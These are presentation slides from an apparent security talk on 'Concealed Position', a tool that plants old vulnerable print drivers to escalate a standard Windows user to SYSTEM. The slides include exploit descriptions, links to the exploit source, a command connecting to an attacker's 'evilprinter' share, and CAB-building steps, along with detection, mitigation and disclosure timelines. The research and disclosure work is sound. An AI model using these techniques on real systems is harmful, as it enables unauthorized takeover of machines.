STAGING A PRINT DRIVER
IS THIS A WINDOWS VULNERABILITY?
YES!
● We crossed a security boundary
● A standard user wrote a driver of their choosing 
into the Driver Store
● The driver we chose let’s us escalate to SYSTEM.
49
STAGING A PRINT DRIVER
IS THIS A WINDOWS VULNERABILITY?
NO!
● This is working as designed.
● Features aren’t vulnerabilities.
50
STAGING A PRINT DRIVER
IS THIS A WINDOWS VULNERABILITY?
51
STAGING A PRINT DRIVER
IS THIS USEFUL?
YES!
● Nothing stopping us from installing old print 
drivers with known vulnerabilities
● No obvious way to patch this
52
BRING YOUR OWN PRINT DRIVER VULNERABILITY
53
BRING YOUR OWN PRINT DRIVER VULNERABILITY
TOOL INTRODUCTION: CONCEALED POSITION
https://github.com/jacob-baines/concealed_position/
54
BRING YOUR OWN PRINT DRIVER VULNERABILITY
CONCEALED POSITION
● Developed in C++
● Bad ASCII art
● Three components:
a. Server: Configuring the evil printer
b. Client: Automates driver staging and privilege 
escalation
c. DLL: The code to execute as SYSTEM
55
BRING YOUR OWN PRINT DRIVER VULNERABILITY
CONCEALED POSITION
● Currently implements four LPE exploits
● All with silly names. Because names are fun.
○ CVE-2020-1300: SlashingDamage (Windows)
○ CVE-2019-19363: PoisonDamage (Ricoh)
○ CVE-2021-35449: AcidDamage (Lexmark)
○ ???: RadiantDamage (Canon)
● The last three supports local-only exploitation if the 
affected driver is in the driver store.
56
BRING YOUR OWN PRINT DRIVER VULNERABILITY
CONCEALED POSITION SERVER
57
BRING YOUR OWN PRINT DRIVER VULNERABILITY
CONCEALED POSITION CLIENT
58
BRING YOUR OWN PRINT DRIVER VULNERABILITY
CONCEALED POSITION CLIENT IN ACTION
59
BRING YOUR OWN PRINT DRIVER VULNERABILITY
CLIENT PRINTER WINAPI CALLS
• Calls to the remote printer:
• OpenPrinter
• GetPrinterDriver
• ClosePrinter
• Local calls:
•
InstallPrinterDriverFromPackage
• AddPrinter
• DeletePrinter
• ClosePrinter
• Silent
• No UI
• No windows update
60
BRING YOUR OWN PRINT DRIVER VULNERABILITY
WHY NOT POWERSHELL?
• The following will introduce the driver to the driver store:
AddPrinter -ConnectionName \\10.0.0.6\evilprinter
• Invokes and gets stuck in Windows Update
• Plus, I just like C++
61
NEW DRIVER VULNERABILITIES
62
NEW DRIVER VULNERABILITIES
CVE-2021-35449: ACIDDAMAGE
• Lexmark Universal Printer Driver 2.15.1.0 and below
• Reads attacker controlled configuration file from 
ProgramData to locate .dll
• Attacker inserts a malicious dll to escalate to SYSTEM.
63
NEW DRIVER VULNERABILITIES
CVE-2021-35449: ACIDDAMAGE
• The Concealed Position implementation is here:
https://github.com/jacob-baines/concealed_position/blob/main/src/cp_client/aciddamage.cpp
• Metasploit pull request should exist at the time of 
presentation. Sorry! Challenges of recording weeks in 
advance.
64
NEW DRIVER VULNERABILITIES
CVE-2021-35449: ACIDDAMAGE
• Remember: Evil Printer Needs a CAB file
• Just download 2.10.0.5 from the Update Catalog
65
NEW DRIVER VULNERABILITIES
CVE-2021-35449: ACIDDAMAGE
66
NEW DRIVER VULNERABILITIES
CVE-2021-35449: ACIDDAMAGE
67
NEW DRIVER VULNERABILITIES
CVE-2021-35449: ACIDDAMAGE
> dir /s /b /a-d > ../files.txt
-- modify files.txt to include DestinationDir --
> makecab /D MaxDiskSize=268435456 /d “CabinetName1=LMUD1o40.cab” /f ../files.txt
68
NEW DRIVER VULNERABILITIES
CVE-2021-??? RADIANTDAMAGE
• Canon TR150 Driver 3.71.2.10 and below.
• Successful attack escalates privileges to SYSTEM.
69
NEW DRIVER VULNERABILITIES
CVE-2021-??? RADIANTDAMAGE
• Similar to Ricoh vulnerability. Race condition to 
overwrite dll in C:\ProgramData\CanonBJ\IJPrinter\CNMWINDOWS\Canon 
TR150 Series\LanguageModules\
• Harder to time than Ricoh vulnerability.
70
NEW DRIVER VULNERABILITIES
CVE-2021-??? RADIANTDAMAGE
71
NEW DRIVER VULNERABILITIES
CVE-2021-??? RADIANTDAMAGE
72
NEW DRIVER VULNERABILITIES
CVE-2021-??? RADIANTDAMAGE
> dir /s /b /a-d > ../files.txt
> makecab /D MaxDiskSize=268435456 /d “CabinetName1=TR1506.cab” /f ../files.txt
73
NEW DRIVER VULNERABILITIES
CVE-2021-???: RADIANTDAMAGE
• Implementation can be found here:
https://github.com/jacob-baines/concealed_position/blob/main/src/cp_client/radiantdamage.cpp
• Metasploit pull request should exist at the time of 
presentation. Sorry! Challenges of recording weeks in 
advance.
74
DETECTION & MITIGATION
75
DETECTION
EVENT ID 600
76
DETECTION
EVENT ID 215
77
DETECTION
SETUPAPI.DEV
78
DETECTION
ON THE WIRE
https://github.com/jacob-baines/concealed_position/tree/main/detection
79
DETECTION
UNIQUE STRING
• cp_client.exe has a 64 byte unique string embedded 
for detection: WVqtcQKfeIUxunX1jAadGwMiir5LacjHwN8tVl1Pr7AiwJnZCsik2TxHLZgGhErb
• YARA rule in the detections subdirectory
80
MITIGATIONS
• Patching might never be an 
option.
• Search user driver stores for 
affected drivers and remove 
them. pnputil.exe 
/enum-drivers
• GPO is useful here. Enable 
“Package Point and Print - 
Approved Servers”
81
DISCLOSURES & FUTURE WORK
82
DISCLOSURE
• Similar disclosures sent to Lexmark, Canon, and 
Microsoft on 18 June 2021.
• All were provided with descriptions of their specific 
issues.
• All were given versions of concealed position.
• All were informed of the 7 August 2021 disclosure date.
83
LEXMARK: DISCLOSURE TIMELINE
• 18 June 2021: Disclosure sent to PI:EMAIL
• 18 June 2021: Lexmark acknowledges receipt
• 21 June 2021: Lexmark confirms the issue
• 21 June 2021: CVE request sent to MITRE
• 30 June 2021: Ask MITRE again to assign CVE.
• 30 June 2021: Lexmark provides beta patch for testing.
• 1 July 2021: Inform Lexmark the beta patch addresses the 
issue.
• 2 July 2021: Ask MITRE about the status of the CVE assignment.
• 2 July 2021: CVE-2021-35449 is assigned and Lexmark is 
informed.
• 6 July 2021: Emails are exchanged about credit in the 
advisory.
• 13 July 2021: Lexmark shared a copy of their advisory to be 
released later in the week.
84
CANON: DISCLOSURE TIMELINE
• 18 June 2021: Disclosure emailed to Canon PSIRT
• 21 June 2021: Acknowledgement of receipt
• 21-22 June 2021: Emails exchanged regarding the affected 
component.
• 26 June 2021: Canon is asked for an update.
• 29 June 2021: Canon states they will update shortly.
• 1 July 2021: Canon is asked again for an update and to confirm the 
vulnerability.
• 9 July 2021: Canon again asked for an update and to confirm the 
vulnerability.
• 12 July 2021: Canon asks if a July 4 security patch fixes the issue.
• 12 July 2021: Canon is told the patch has no effect on the reported 
vulnerability. Canon is asked if they have tried the proof of concept 
or if they are confused about the affected file path.
• 12 July 2021: Canon acknowledges but doesn’t answer questions.
85
MICROSOFT: DISCLOSURE TIMELINE
•
18 June 2021: Disclosure sent to Microsoft Security Response Center (MSRC)
•
18 June 2021: MSRC send an automated acknowledgement
•
18 June 2021: MSRC assigns a case ID
•
1 July 2021: MSRC is asked for an update
•
1 July 2021: MSRC indicates they are working to reproduce.
•
1 July 2021: MSRC states they are having issues reproducing the issue. Ask a 
couple of questions.
•
1 July 2021: MSRC is asked exactly where they are experiencing issues and if it is 
PoC configuration related.
•
2 July 2021: MSRC restates questions.
•
2 July 2021: MSRC is provided with answers
•
4 July 2021: MSRC is provided with a clarification on MSAPI usage.
•
8 July 2021: MSRC says they can’t reproduce because 
InstallPrinterDriverFromPackage requires admin privileges.
•
8 July 2021: MSRC is informed that isn’t true for drivers in the driver store. MSRC is 
asked if a PoC video would help.
•
8 July 2021: MSRC indicates a PoC video always helps.
•
9 July 2021: MSRC is sent a PoC video and updated code.
•
12 July 2021: MSRC acknowledges the issue.
86
FUTURE WORK
• Many more drivers to analyze
• Phase out use of CutePDF
• USB NDIS Attack
• Polish Concealed Position 
functionality
THANK YOU!